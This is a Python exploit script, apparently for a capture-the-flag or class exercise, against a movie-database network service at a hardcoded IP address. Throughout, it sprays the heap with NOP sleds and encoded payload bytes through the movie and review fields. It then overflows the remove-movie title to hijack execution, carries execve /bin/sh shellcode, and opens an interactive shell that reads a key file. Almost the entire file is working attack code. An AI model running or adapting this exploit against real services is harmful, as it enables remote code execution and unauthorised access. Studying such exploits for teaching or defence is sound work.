#!/usr/bin/python

from sock import *
import sys
import time
import errno
                                                                                                    
###############################################################################
#                                                                             # 
#   Skeleton exploit for use                                                  #
#   Uses a nice socket library (https://github.com/hellman/sock/)             #
#   Actually read this ans feel free to modify!                               #
#                                                                             # 
###############################################################################

LOCAL = False
DEBUG = False

if LOCAL:
    HOST = "localhost"
    PORT = "55000"
    SLEEP_TIME = 0
    MAX_ENTRIES = 16384
else:
    HOST = "54.215.5.83"
    PORT = "3036"
    SLEEP_TIME = 0
    MAX_ENTRIES = 8000

NOP = "\x90"
HEAP_ADDRESS = "\x0b\x45\xc0\x08"

# Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

attempts = 0

################################################################################
#
#   pause_script
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily
#
################################################################################
def pause_script():
    raw_input("Paused... Press enter to continue: ")

################################################################################
#
#   pause_script_msg
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily, prints a custom message
#
################################################################################
def pause_script_msg(message):
    raw_input("Paused... " + message)

################################################################################
#
#   connect
#
################################################################################
def connect():
    con = Sock(HOST + ":" + PORT)
    return con

################################################################################
#
#   clear_read_buffer
#
#   This will clear the read buffer and print all of it
#
################################################################################
def clear_read_buffer(con):
    r = con.read_one(0)
    while len(r) > 0:
        print r
        r = con.read_one(0)

################################################################################
#
#   remove_movie
#
#   This will remove a movie, and tell you success
#
################################################################################
def remove_movie(title,con):
    # Choose the remove option from the main menu
    #con.send_line("d")
    con.send("d") 
    con.send("\n") 

    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    #pause_script_msg("Press Enter to receive response")

    # Wait for a response
    time.sleep(1)

    # Read the response
    resp = con.read_line()

    # Did we delete the movie?
    return "Removed movie!" in resp

################################################################################
#
#   review_movie
#
#   This will review a movie
#
################################################################################
def review_movie(title, review, con):
    # Choose the remove option from the main menu
    con.send_line("r")
    
    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)

    # Send the review
    con.send_line(review)

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Read the response
    resp = con.read_line()

    # Did we delete the movie?
    return "Reviewed!" in resp

################################################################################
#
#   send_movie
#
#   This will add a movie
#
################################################################################
def send_movie(movie,con):
    # Choose the add option
    con.send_line("a")

    # Send all the data in order
    con.send_line(movie["title"])
    con.send_line(movie["director"])
    con.send_line(movie["writer"])
    con.send_line(movie["star1"])
    con.send_line(movie["star2"])
    con.send_line(movie["star3"])
    con.send_line(movie["star4"])
    con.send_line(movie["star5"])
    con.send_line(movie["summary"])
    con.send_line(movie["country"])
    con.send_line(movie["budget"])
    con.send_line(movie["opening_weekend"])
    con.send_line(movie["gross"])
    con.send_line(movie["runtime"])
    con.send_line(movie["aspect"])
    con.send_line(movie["composer"])
    con.send_line(movie["average_rating"])

################################################################################
#
#   go_interactive
#
#   Switches to an interactive mode, good for shells maybe
#   You can't get out of interactive mode
#
################################################################################
def go_interactive(con):


    con.write("ls\n")
    time.sleep(1)
    resp = con.read_one(0)
    print resp
    if not resp:
        return False

    con.write("cat key\n")

    print "\aSuccess! Attempts: " + `attempts`
    print "Entering interactive mode:"

    while True:
        time.sleep(1)
        print con.read_one(0)
        con.write(sys.stdin.readline())

################################################################################
#
#   hijack_execution
#
################################################################################
def hijack_execution(con):

    #time.sleep(5)

    # Setup overflow string
    overflow_string = ""
    overflow_size = 528

    for i in range(0, overflow_size):
        overflow_string += "k"

    overflow_string += HEAP_ADDRESS

    # Choose the remove option from the main menu
    con.send_line("d")

    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)

    if DEBUG:
        pause_script_msg("Press Enter to Pwn")
    
    # Send the "movie title"
    con.send_line(overflow_string)

    time.sleep(5)
    resp = con.read_one(0)
    if "Unable to find movie!" in resp:
        print "\nHijack executed"
    #resp = con.read_line()

    #return "Unable to find movie!" in resp
    #con.write("ls\n")
    #time.sleep(1)
    #resp = con.read_line()

    #return resp


################################################################################
#
#   build_nop_string
#
################################################################################
def build_nop_string(size):
    nop_string = ""

    for i in range(0, size):
        nop_string += NOP

    return nop_string

################################################################################
#
#   build_string
#
################################################################################
def build_string(string, size):
    built_string = ""

    for i in range(0, size):
        built_string += string

    return built_string

################################################################################
#
#   build_movie
#
################################################################################
def build_movie():

    title           = build_nop_string(500)

    # director 300 - 6
    directorNop     = "\xd9\x5c\xe5\x42\x43\xb5\x7c\x42\xaa\x56"
    director        = build_string(directorNop, 30)

    writer          = build_nop_string(300)
    star1           = build_nop_string(300)
    star2           = build_nop_string(300)

    # star3 300 - 50
    star3Nop        = ("\x7a\x36\x98\x36\x93\x09\x09\xf5\xd9\xbd\xda\x13\xa2\x3d\x1b\x2b\x7e\x28\x4e\x51"
        "\x3b\xba\x7e\xb5\xa4\x4e\x92\x30\xeb\xc6\xf1\x92\xa3\xd0\x79\x8c\xca\xe8\x95\x21\x66\x38\xf7\x47"
        "\x4a\x54\x93\x77\xe1\x6e")
    star3           = build_string(star3Nop, 6)

    star4           = build_nop_string(300)

    # star5 300 - 100
    star5Nop        = "\x06\x46\xcd\xa6\xb4\x1e\x1c\x31\xa5\x01\xf8\x0c\x5d\xb6\xac\x75\x12\xf7\x93\x90\x65\x4b\x6b\xf2\xcf\x0d\xbd\x20\x09\x9e\xa3\xbb\x64\x4e\x18\xcf\xd6\xe5\x43\x92\x93\x24\x7b\x94\xaa\xac\x76\xb8\x90\x36\x5e\x39\x0c\xa4\xc1\x81\x91\xaf\x32\x9f\x92\x46\x8b\x7c\x20\xe5\x15\xeb\x92\x91\x1e\xb8\x12\x4f\x56\x2b\x28\x15\x8a\x6f\xfa\x7c\xfd\xa3\xae\xf6\x4e\xd4\xf2\xbd\x58\x80\xc8\xd7\x3c\xeb\x9e\xc3\x0f\x82"
    star5           = build_string(star5Nop, 3)

    # summary 2000 - 80
    summaryNop      = "\x12\x6c\xcd\x0d\xcd\x54\x6e\x76\x39\x26\x08\xa5\x6b\x92\xb8\x03\x9b\x59\xf4\x01\x16\xa2\x92\x8d\xac\x70\x77\xc7\x8a\x3f\xe3\x8a\x56\xd5\xc5\x33\xb5\x99\x2d\x40\xbc\x32\x0c\x82\xbb\xb5\x84\xef\xea\x06\x15\x0c\x40\xec\x35\xdc\x4c\xa6\xed\xa6\xf2\x08\x45\x75\x2e\xa0\x1e\x73\x81\x93\x4b\xa6\x91\x79\x25\x59\x89\x1c\xf4\xf4"
    summary         = build_string(summaryNop, 25)

    country         = build_nop_string(30)
    budget          = build_nop_string(80)

    # open_weekend 80 - 80
    #weekendNop      = ("\x46\xb2\x71\x94\x0e\x21\xf5\x65\xe2\x8f\x49\xbe\xe1\xbe\xc8\x3e\x78\xbe\xd4\x75"
    #    "\xd4\x7e\xcf\x44\x16\x4c\x80\x45\x76\xe0\xa8\x3c\x20\x10\x46\xe9\xd6\x06\x15\x9a\x3c\xdf\x1c\x39"
    #    "\x27\x08\xbd\x3b\x84\x8a\x1b\xb6\xa6\x8d\xae\x28\xdf\xb1\x75\x6e\x33\x67\x4e\xb6\x7a\x4b\x72\xf7"
    #    "\x70\x4e\x5a\x4c\x84\x2e\x32\x6f\xb8\x42\x1e\x84")
    #opening_weekend = weekendNop
    opening_weekend = build_nop_string(80)

    # gross 80 - 20
    #grossNop        = "\x5f\x8e\xa3\xda\x1f\xb6\x5d\x1d\x16\x1c\xde\xe6\xaf\x8f\x36\x73\xbd\x39\x15\x4d"
    #gross           = build_string(grossNop, 4)
    gross           = build_nop_string(80)

    # runtime 80 - 20
    #runtimeNop      = "\x6c\x1c\x57\x93\x73\xca\x3d\xa0\x9c\xbd\xdd\x8c\x7e\xa7\x21\xc1\xe5\x09\x7d\x06"
    #runtime         = build_string(runtimeNop, 4)
    runtime         = build_nop_string(80)

    # aspect 40 - 4
    aspectNop       = "\x9c\x90\xd9\xdb"
    aspect          = build_string(aspectNop, 10)
    #aspect          = build_nop_string(40)

    # composer 300 - 6
    composerNop     = "\x63\xff\x2e\x2d\xec\xf9"
    composer        = build_string(composerNop, 46)

    composer       += "\x63\xff\x2e\xd7\x77\x31"
    composer       += "\x6a\x3d\xd6\x92\x53\x1a"
    composer       += "\x9b\x07\x91\xdf\x15\x07"
    composer       += "\x7a\x8c\x8f\x74\xb1\xe9"
    #composer        = build_nop_string(279)
    #composer       += SHELLCODE

    average_rating  = build_nop_string(3)

    movie = {           
              "title" : title,
           "director" : director,
             "writer" : writer,
              "star1" : star1,
              "star2" : star2,
              "star3" : star3,
              "star4" : star4,
              "star5" : star5,
            "summary" : summary,
            "country" : country,
             "budget" : budget,
    "opening_weekend" : opening_weekend,
              "gross" : gross,
            "runtime" : runtime,
             "aspect" : aspect,
           "composer" : composer,
     "average_rating" : average_rating
    }

    #print "title: " + `len(title)`
    #print "director: " + `len(director)`
    #print "writer: " + `len(writer)`
    #print "star1: " + `len(star1)`
    #print "star2: " + `len(star2)`
    #print "star3: " + `len(star3)`
    #print "star4: " + `len(star4)`
    #print "star5: " + `len(star5)`
    #print "summary: " + `len(summary)`
    #print "country: " + `len(country)`
    #print "budget: " + `len(budget)`
    #print "opening_weekend: " + `len(opening_weekend)`
    #print "gross: " + `len(gross)`
    #print "runtime: " + `len(runtime)`
    #print "aspect: " + `len(aspect)`
    #print "composer: " + `len(composer)`
    #print "average_rating: " + `len(average_rating)`

    return movie

################################################################################
#
#   Main
#
################################################################################

while True:
    attempts += 1
    print "Initiating exploit... Attempt #" + `attempts`

    # Start the connection
    con = connect()

    if DEBUG:
        pause_script_msg("Press Enter to start exploit")
    else:
        time.sleep(1)

    movie = build_movie()

    send_movie(movie, con)

    print "Movie sent"

    # Create reviews to amplify the spray

    title  = NOP + "\0"
    review = build_nop_string(3)

    print "Sending reviews:"
    for i in range(0, MAX_ENTRIES):
        review_movie(title, review, con)
        print(`i` + "..."),
        if ((i + 1) % 10 == 0):
            print ""

    hijack_execution(con)

    if not go_interactive(con):
        continue
